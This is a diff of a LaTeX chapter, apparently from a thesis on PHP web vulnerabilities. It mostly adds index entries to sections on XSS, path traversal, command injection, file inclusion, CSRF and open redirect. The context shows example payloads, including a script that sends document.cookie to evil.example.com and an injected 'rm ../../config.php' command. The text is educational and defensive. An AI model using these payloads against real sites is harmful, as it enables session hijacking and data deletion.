@@ -73,7 +73,7 @@ This effectively deletes all records from the \texttt{posts} table.
 \begin{figure}[htb]
   \begin{center}
     \includegraphics[width=\textwidth]{images/exploits_of_a_mom}
-    \caption{Cross-site scripting once even was made the subject of the popular geek web comic \emph{xkcd}. This comic strip was used with permission. It is available online at \url{http://xkcd.com/327/}.}
+    \caption{Cross-site scripting once even was made the subject of the popular geek web comic \emph{xkcd}. This comic strip was used with permission. It is available online at \url{http://xkcd.com/327/}.\index{xkcd}}
     \label{fig:exploits-of-a-mom}
   \end{center}
 \end{figure}
@@ -102,15 +102,16 @@ http://example.com/blog.php?email=<script>image=new Image();
   image.src="http://evil.example.com/?c="+document.cookie</script>
 \end{textcode}
 
-This results in sending the current cookies to a (potentially) malicious server, allowing an attacker to hijack the user's current session.
+This results in sending the current cookies\index{cookies} to a (potentially) malicious server, allowing an attacker to hijack the user's current session (also called \emph{session riding}).\index{session riding}\index{session hijacking}
 
 XSS opens the gates to many kinds of attacks. For example, it is possible to read the passwords from a login form after they have automatically been filled in by the browser's password storage. It also allows reading the clipboard content and sending it to another server.
 
-Even the site of the German government was susceptible to this type of vulnerability.~\cite{xss-bundesregierung}
+Even the web site of the German government was susceptible to this type of vulnerability.~\cite{xss-bundesregierung}
 
 
 \subsection{Persistent XSS}
 \label{persistent-xss}\index{persistent cross-site scripting}\index{persistent XSS|see{persistent cross-site scripting}}
+
 Persistent cross-site scripting (persistent XSS) is a variant of the XSS vulnerability. It refers to the case when untrusted data is first stored in the file system or database, and some other part of the application then uses the stored data for output, thus inserting the malicious data in the output---even if the page is loaded from a clean URL. This is a lot harder to find via tainted object propagation due to the database being between the source and the sink, causing the source and the sink to come into action during separate requests. One way to make this detectable would be to mark data from the database as basically untrusted, which however might increase the number of false positives.
 
 This is an example of vulnerable code:
@@ -129,17 +130,19 @@ An attacker could use the post submission form and enter a title like this:
 </script>
 \end{htmlcode}
 
-This code would send the site's current cookies to the server \texttt{evil.example.com}. The cookies can include the user's current session ID, which would allow the attacker to use the session ID for conducting a session-riding attack (which is also called ``session hijacking'').~\cite{kunz-esser}
+This code would send the site's current cookies\index{cookies} to the server \texttt{evil.example.com}. The cookies can include the user's current session ID, which would allow the attacker to use the session ID for conducting a session-riding attack (which is also called ``session hijacking'').~\cite{kunz-esser}\index{session riding}\index{session hijacking}
 
 \subsection{HTTP Response Splitting}
 \label{http-response-splitting}\index{HTTP response splitting}
+
 An HTTP response splitting attack is based on code allowing unsanitized CRLF (0x0d0a) character combinations to be included in HTTP headers, thus creating multiple headers.
 
-However, as of PHP versions 4.4.2 and 5.1.2, the \texttt{header()} function only allows one header at a time, thus preventing header injection attacks. \cite{php-manual-header}
+However, as of PHP versions 4.4.2 and 5.1.2, the \texttt{header()} function only allows one header at a time, thus preventing header injection attacks. \cite{php-manual-header}\index{header()}
 
 
 \subsection{Directory Traversal/Path Traversal}
 \label{directory-traversal}\index{directory traversal}\index{path traversal}
+
 Directory traversal (also known as \emph{path traversal}) is possible if a vulnerable application includes or outputs a file using a path that comes from an untrusted source. If the application does not check that the path is relative and does not contain two dots (\texttt{..}) (directly or URL-encoded), it is possible to read or overwrite files that should not be visible, \eg \texttt{/etc/passwd/} or the file with the database credential of the application.
 
 This is an example of vulnerable code:
@@ -166,7 +169,7 @@ This would result in \texttt{/etc/passwd} (the file containing the login names o
 
 \subsection{OS Command Injection}
 \label{os-command-injection}\index{OS command injection}
-OS command injection is based on malicious input getting in while executing shell commands. Vulnerable code could look like this:
+OS command injection is based on malicious input getting in while executing shell commands.\index{shell commands} Vulnerable code could look like this:
 
 \begin{phpcode}
 echo $createHeader();
@@ -193,6 +196,7 @@ touch file & rm ../../config.php
 
 \subsection{PHP File Inclusion, Remote Code Injection, Remote Command Execution}
 \label{remote-command-injection}\index{PHP file inclusion}\index{remote code injection}\index{remote command execution}
+
 PHP file inclusion (also known as \emph{remote code injection} or \emph{remote command execution}) is a PHP-specific vulnerability that occurs when a PHP script includes another script file and takes the path of the file to include from an untrusted source. Depending on the configuration of the system, the path of the file to include may also be a remote URL, thus making this kind of vulnerability possible in the first place.
 
 This is an example of vulnerable code:
@@ -218,9 +222,10 @@ As a result, this URL will include and execute the PHP contained in the remote f
 
 \subsection{E-Mail Header Injection}
 \label{header-injection}\index{e-mail header injection}\index{mail header injection|see{e-mail header injection}}
+
 E-Mail header injection is an attack that makes use of e-mail forms or other mail functionality that uses untrusted data in e-mail header fields (like \texttt{From:}, \texttt{To:}, \texttt{Cc:} or \texttt{Subject:}).
 
-If header-relevant data in contact forms (such as the sender's name or the subject) is not sanitized of linefeeds or carriage returns, it is possible to include additional header lines like bcc:, allowing the form to be misused for sending SPAM e-mails.
+If header-relevant data in contact forms (such as the sender's name or the subject) is not sanitized of linefeeds or carriage returns\index{linefeeds}\index{carriage returns}, it is possible to include additional header lines like bcc:, allowing the form to be misused for sending SPAM e-mails.
 
 The code of a vulnerable e-mail form could look like this:
 
@@ -279,7 +284,7 @@ Open Redirect & \#22 & CWE-601 & \cite{open-redirect-google}\\
 
 
 \subsection{Information Disclosure/Information Exposure}
-\label{information-disclosure}\index{information disclosure}
+\label{information-disclosure}\index{information disclosure}\index{information exposure}
 Information disclosure (also known as \emph{information exposure}) emerges when an application discloses internal information like database user names or the executed SQL, \eg in error messages or HTML comments.
 
 This is an example of vulnerable code:
@@ -298,11 +303,12 @@ public function query($sql) {
 
 The attacker then would need to find a bug in the web application that causes the query to fail. This would expose table names and possible column names, providing valuable information for other attacks like SQL injection (see page~\pageref{sql-injection}).
 
-Apart from the code itself being vulnerable, having PHP configured with \texttt{display\_errors = On} makes the complete installation vulnerable as this causes any error messages from PHP to be output directly on the web page.
+Apart from the code itself being vulnerable, having PHP configured with \texttt{display\_errors = On}\index{display\_errors} makes the complete installation vulnerable as this causes any error messages from PHP to be output directly on the web page.
 
 
 \subsection{Full Path Disclosure}
 \label{path-disclosure}\index{full path disclosure}
+
 \emph{Full path disclosure} vulnerabilities are a subset of the \emph{information disclosure} class of vulnerabilities. It refers to an application disclosing the full path of the application or file, for example in error messages.
 
 This is an example of vulnerable code:
@@ -329,9 +335,9 @@ If the attacker finds a case of a file not being readable, this would expose the
 \label{xscr,csrf}\index{cross-site request forgery}\index{CSRF|see{cross-site request forgery}}\index{XSRF|see{cross-site request forgery}}\index{session}
 Cross-site request forgery (CSRF/XSRF) means that the current user session of a web application (e.g., in an open browser tab) is misused to execute certain actions on that site via malicious links, \eg sending SPAM, changing the user's password or deleting their profile.
 
-A common protection against a CSRF attack is requiring a token to be submitted together with the request. This token is unique to the current user session and usually not visible to the user. An attacker would need to retrieve the current session token, and merely submitting a fixed URL with a request would not work anymore. Facebook and TYPO3 use the token technique.~\cite{facebook-tokens, typo3-csrf}
+A common protection against a CSRF attack is requiring a session token\index{session token}\index{token\see{session token}} to be submitted together with the request. This token is unique to the current user session and usually not visible to the user. An attacker would need to retrieve the current session token, and merely submitting a fixed URL with a request would not work anymore. Facebook and TYPO3 C;S use the token technique.~\cite{facebook-tokens, typo3-csrf}\index{Facebook}\index{TYPO3 CMS}
 
-The danger of CSRF is greatly increased if the site is susceptible to XSS since being able to execute JavaScript in the target web site's context would allow an attacker to retrieve the current token.
+The danger of CSRF is greatly increased if the site is susceptible to cross-site scripting\index{cross-site scripting} since being able to execute JavaScript in the target web site's context would allow an attacker to retrieve the current token.
 
 
 \subsection{Open Redirect}
@@ -342,6 +348,7 @@ A web application is susceptible to an open redirect attack if it uses untrusted
 \begin{phpcode}
 header('Location: ' . $_GET['redirect_url']);
 \end{phpcode}
+\index{header()}
 
 The URL of an attack could look like this:
 
@@ -353,7 +360,7 @@ http://www.example.com/this/is/some/long/path.html
 
 This would allow an attacker to lure a user first onto a legit site (as the first part of the URL is a legit, albeit vulnerable site) and then redirect the user to some phishing site.
 
-This attack is hard to scan for automatically because some redirects may be valid (and not vulnerable). To protect against this type of attack, white-listing is the recommended approach for validation. Validation, however, is not the same as sanitation, and currently cannot be scanned for using a tainted object propagation scanner.
+This attack is hard to scan for automatically because some redirects may be valid (and not vulnerable). To protect against this type of attack, white-listing is the recommended approach for validation.\index{validation} Validation, however, is not the same as sanitation\index{sanitation}, and currently cannot be scanned for using a tainted object propagation scanner.
 
 
 \section{How to Lure Users onto Untrusted URLs}
